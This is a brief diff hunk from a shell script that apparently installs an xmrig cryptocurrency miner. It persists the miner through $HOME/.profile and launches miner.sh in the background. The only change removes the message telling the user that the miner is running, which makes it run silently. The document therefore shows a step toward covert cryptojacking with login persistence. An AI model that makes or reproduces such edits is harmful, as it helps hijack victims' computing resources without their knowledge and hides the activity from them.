@@ -188,7 +188,6 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/mmain/miner.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/mmain/xmrig.log file)"
   /bin/bash $HOME/mmain/miner.sh
 else
 
